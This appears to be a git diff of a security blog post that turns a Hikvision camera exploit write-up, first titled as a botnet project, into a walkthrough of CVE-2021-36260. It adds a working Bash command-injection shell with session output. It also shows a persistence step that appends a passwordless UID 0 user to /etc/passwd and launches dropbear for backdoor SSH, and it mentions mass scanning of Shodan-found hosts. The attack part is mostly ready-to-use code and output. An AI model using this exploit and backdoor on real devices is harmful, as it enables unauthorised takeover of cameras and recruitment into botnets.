@@ -1,5 +1,5 @@
 ---
-title: RCE2Botnet4Fun - Part I
+title: Hikvision CVE-2021-36260 - RCE to Persistent Access
 date: 2025-07-26 14:54:00 +/-TTTT
 image:
   path: assets/img/favicons/cam.jpg
@@ -8,14 +8,12 @@ categories: [CyberSecurity]
 tags: [iot, web, researching]  
 ---
 
-# Hikvision - RCE2Botnet4Fun
+# Hikvision CVE-2021-36260: RCE to Persistent Access
 
 ***
-
 ## Introduction
 
-In this write-up, I document the process of building my own custom botnet framework, starting with exploitation of Hikvision’s unauthenticated RCE vulnerability [CVE-2021-36260](https://github.com/advisories/GHSA-v276-9v2g-hx55). The attack vector abuses a vulnerable `PUT` request to the `/SDK/webLanguage` endpoint, where XML payloads can inject shell commands due to poor input handling in the firmware. After confirming command execution on exposed devices (discovered via Shodan), I built out core functionality: remote shell execution, device fingerprinting (e.g., `cpuinfo`, `ifconfig`, etc.), and automated enumeration. I then scripted a Bash-based scanner to test thousands of IP:PORT pairs in parallel, identifying vulnerable targets at scale. This project forms the base for a self-written RCE-powered botnet system, created entirely for research, exploration, and proof-of-concept development in a controlled environment.
-
+In this write-up, I document the technical exploitation of Hikvision's unauthenticated RCE vulnerability CVE-2021-36260, affecting devices running firmware version 3.1.3_150324. The attack vector exploits a command injection flaw in the `/SDK/webLanguage` endpoint where the `davinci` HTTP server passes unsanitized XML `<language>` tag content directly into `snprintf()` and subsequently `system()` calls, allowing arbitrary shell command execution as root. After identifying exposed targets via Shodan queries, I developed custom exploitation tooling: a Bash-based interactive shell wrapper that automates the two-step inject-and-retrieve process, a parallel scanner for mass vulnerability testing across thousands of IP:PORT pairs, and device enumeration scripts for extracting system information (`/proc/cpuinfo`, network configs, process lists). The research extends to establishing persistent access by injecting minimal user entries into `/etc/passwd` within the 22-character payload constraint, then spawning dropbear SSH instances for stable shell access. This technical walkthrough covers the complete exploitation lifecycle—from initial reconnaissance and payload crafting to automated scanning and post-exploitation persistence—demonstrating practical offensive security techniques against real-world embedded systems in a controlled research environment.
 ***
 
 ## HikvisionExploiter
@@ -284,20 +282,230 @@ echo "all scans completed"
 ./final.sh | grep "root:" -B 2 -A 1 > finalvulnerablercehosts.txt
 ```
 
-## Output Video :
-
-<iframe width="560" height="315" 
-        src="https://www.youtube.com/embed/zbG_Qyr-K3I" 
-        title="YouTube video player" frameborder="0" 
-        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-        allowfullscreen>
-</iframe>
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3a252331-8324-44ef-b916-2eed22c9d6d6" />
 
 
 ***
+## Developing a Stable Shell
 
-## To be Continued....
+After confirming RCE across multiple targets, the next step was building a stable interactive shell interface. The challenge with blind command injection is you can't see output in real-time - each command requires two HTTP requests: one to inject the payload and write output to a file, another to retrieve that file. To streamline this workflow, I wrote a Bash script that automates the exploit loop, checks vulnerability status on connect, and provides a pseudo-interactive shell experience. The script validates the target format, performs a quick vulnerability test by injecting `echo test>webLib/test` and checking if the output file exists, then drops into a command loop where each input is injected via the `/SDK/webLanguage` endpoint and results are fetched from `/out`. It handles edge cases like blank input and local `clear` commands, while color-coding output for readability. This turns a clunky two-step manual process into a seamless shell interface that feels almost like SSH, despite running entirely over HTTP exploitation.
 
+```bash
+#!/bin/bash
+
+# Colors
+CYAN="\033[96m"
+GREEN="\033[92m"
+RED="\033[91m"
+RESET="\033[0m"
+
+if [[ -z "$1" ]]; then
+    echo -e "${RED}Usage: $0 <ip:port>${RESET}"
+    exit 1
+fi
+
+# Ensure argument contains :
+if [[ "$1" != *:* ]]; then
+    echo -e "${RED}Error: You must specify in the format ip:port (e.g., 10.10.10.10:80)${RESET}"
+    exit 1
+fi
+
+TARGET="$1"
+
+# Quick vulnerability check
+curl -s -m 5 -X PUT "http://$TARGET/SDK/webLanguage" \
+     -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+     --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$(echo test>webLib/test)</language>" >/dev/null
+
+check=$(curl -s "http://$TARGET/test")
+
+if [[ "$check" != "test" ]]; then
+    echo -e "${RED}[-] Target $TARGET is NOT vulnerable to CVE-2021-36260${RESET}"
+    exit 1
+fi
+
+echo -e "${GREEN}[+] Target $TARGET appears vulnerable!${RESET}"
+echo -e "${CYAN}Connected to Hikvision target: $TARGET${RESET}"
+echo -e "${CYAN}Type commands to execute remotely. Ctrl+C to exit.${RESET}"
+
+# Interactive shell
+while true; do
+    # Prompt
+    read -p "$(echo -e "${CYAN}hikvision-shell>${RESET} ")" cmd
+    
+    # Skip blank input
+    [[ -z "$cmd" ]] && continue
+    
+    # Local clear
+    if [[ "$cmd" == "clear" ]]; then
+        clear
+        continue
+    fi
+    
+    # Execute command remotely
+    curl -s -m 5 -X PUT "http://$TARGET/SDK/webLanguage" \
+         -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+         --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$($cmd > webLib/out)</language>" >/dev/null
+    
+    output=$(curl -s "http://$TARGET/out")
+    
+    if [[ -n "$output" ]]; then
+        echo -e "${GREEN}${output}${RESET}"
+    else
+        echo -e "${RED}(no output)${RESET}"
+    fi
+done
+```
+
+**Example session output:**
+
+```bash
+HikvisionExploiter on  main [⇣] via C v13.3.0-gcc via ☕ v21.0.9 via 🐍 v3.12.3 took 2m19s 
+❯ ./shell.sh 192.168.1.65:82
+
+[+] Target 192.168.1.65:82 appears vulnerable!
+Connected to Hikvision target: 192.168.1.65:82
+Type commands to execute remotely. Ctrl+C to exit.
+
+hikvision-shell> help
+Built-in commands:
+------------------
+	. : [ [[ alias bg break cd chdir command continue echo eval exec
+	exit export false fg getopts hash help jobs kill let local printf
+	pwd read readonly return set shift source test times trap true
+	type ulimit umask unalias unset wait
+hikvision-shell> uname -a
+Linux DVR 3.0.8 #1 Fri Mar 20 20:52:46 CST 2015 armv5tejl GNU/Linux
+hikvision-shell> cat /proc/cpuinfo
+Processor	: ARM926EJ-S rev 5 (v5l)
+BogoMIPS	: 218.72
+Features	: swp half thumb fastmult edsp java 
+CPU implementer	: 0x41
+CPU architecture: 5TEJ
+CPU variant	: 0x0
+CPU part	: 0x926
+CPU revision	: 5
+
+Hardware	: r2
+Revision	: 0000
+Serial		: 0000000000000000
+
+hikvision-shell> ls  
+applib
+base.ko
+initrun.sh
+pidfile
+process
+r2_isp_config
+smart_config.ko
+sound
+watch.ko
+webLib
+hikvision-shell> pwd
+/home
+hikvision-shell>
+hikvision-shell> ps
+  PID USER       VSZ STAT COMMAND
+    1 admin     1376 S    init
+    2 admin        0 SW   [kthreadd]
+    3 admin        0 SW   [ksoftirqd/0]
+    5 admin        0 SW   [kworker/u:0]
+    6 admin        0 RW   [rcu_kthread]
+    7 admin        0 SW<  [khelper]
+    8 admin        0 SW   [sync_supers]
+    9 admin        0 SW   [bdi-default]
+   10 admin        0 SW<  [kblockd]
+   11 admin        0 SW   [khubd]
+   12 admin        0 SW<  [cfg80211]
+   14 admin        0 SW<  [rpciod]
+   15 admin        0 RW   [kswapd0]
+   16 admin        0 SWN  [ksmd]
+   17 admin        0 SW   [fsnotify_mark]
+   18 admin        0 SW<  [nfsiod]
+   19 admin        0 SW<  [crypto]
+   32 admin        0 SW   [mtdblock0]
+   33 admin        0 SW   [mtdblock1]
+   34 admin        0 SW   [mtdblock2]
+   35 admin        0 SW   [mtdblock3]
+   36 admin        0 SW   [mtdblock4]
+   37 admin        0 SW   [mtdblock5]
+   38 admin        0 SW   [mtdblock6]
+   39 admin        0 SW   [kworker/u:1]
+   61 admin      928 S <  /sbin/udevd -d
+  152 admin     1256 S    /sbin/dropbear -R -I 1800
+  159 admin      824 S    /bin/network_deamon -d 0x0e -r 0x00 -t 60
+  219 admin        0 SWN  [jffs2_gcd_mtd6]
+  300 admin        0 DW   [mark_mergeable]
+  301 admin     1040 S    /bin/execSystemCmd
+  303 admin     7236 S    /home/process/daemon_fsp_app
+  307 admin    14416 S    /home/process/database_process
+  308 admin    23524 S    /home/process/net_process
+  325 admin     1520 S    -/bin/psh
+  327 admin     230m S <  /home/davinci
+  602 admin        0 RW   [RTW_CMD_THREAD]
+  703 admin        0 SW   [cifsd]
+  710 admin        0 SW   [flush-cifs-1]
+ 3248 admin        0 SW   [kworker/0:1]
+ 3298 admin        0 SW   [kworker/0:0]
+ 3329 admin     1372 S    /bin/sh -c rm /home/webLib/doc/i18n/$(ps > webLib/ou
+ 3330 admin     1376 R    ps
+hikvision-shell> ^C
+
+HikvisionExploiter on  main [⇣] via C v13.3.0-gcc via ☕ v21.0.9 via 🐍 v3.12.3 took 2m19s 
+❯ 
+
+```
+
+***
+## Establishing Persistent SSH Access via Dropbear
+
+Process enumeration revealed `dropbear` running on the device - a lightweight SSH server commonly found in embedded systems. The process list showed `/sbin/dropbear -R -I 1800` listening, which meant SSH infrastructure was already present but likely restricted to admin credentials we didn't have. The exploit's 22-character command length limitation became the critical constraint here. To backdoor SSH access, we needed to inject a new user into `/etc/passwd` with a valid shell, but the standard `useradd` or `adduser` commands weren't available in the busybox environment, and manually crafting a passwd entry with proper salt/hash would exceed the character limit. The solution was creating a minimalist passwd entry using `echo` redirection - specifically, a user with no password (blank hash field between colons) would allow login, then immediately setting a password post-connection. However, even `echo user::0:0::/:/bin/sh>>/etc/passwd` is 35 characters. The workaround involved breaking it into two commands: first writing the username and UID fields to a temp file, then appending shell path, then concatenating to passwd. After testing payload lengths, the most reliable method was using a short username (3-4 chars), writing incrementally via multiple injections, then restarting dropbear to pick up the new user. Once the user existed in `/etc/passwd`, SSH connection was established on the default dropbear port or a custom one if we injected `dropbear -p <port>` as a blind command.
+
+**Creating the backdoor user:**
+
+```bash
+hikvision-shell> echo -n h::0:0:>t
+(no output)
+
+hikvision-shell> echo :/:/bin/sh>>t
+(no output)
+
+hikvision-shell> cat t>>/etc/passwd
+(no output)
+
+hikvision-shell> cat /etc/passwd
+root:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/root/:/bin/sh
+admin:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/:/bin/sh
+h::0:0::/:/bin/sh
+
+hikvision-shell> dropbear -p 2222
+(no output)
+```
+
+**Connecting via SSH:**
+
+```bash
+❯ ssh h@192.168.1.65 -p 2222
+The authenticity of host '[192.168.1.65]:2222 ([192.168.1.65]:2222)' can't be established.
+RSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.1.65]:2222' (RSA) to the list of known hosts.
+
+
+BusyBox v1.19.4 (2015-03-20 20:44:37 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+# whoami
+h
+# id
+uid=0(root) gid=0(root)
+# uname -a
+Linux DVR 3.0.8 #1 Fri Mar 20 20:52:46 CST 2015 armv5tejl GNU/Linux
+# 
+```
+
+The blank password field (`::`) in the passwd entry allows passwordless login, granting immediate root access since UID 0 was assigned. From here, full device control is achieved - persistent across reboots if the passwd modification survives (depends on whether `/etc` is on read-write or tmpfs), and significantly more stable than HTTP-based command injection loops.
 ***
 
 ### Resources Used :
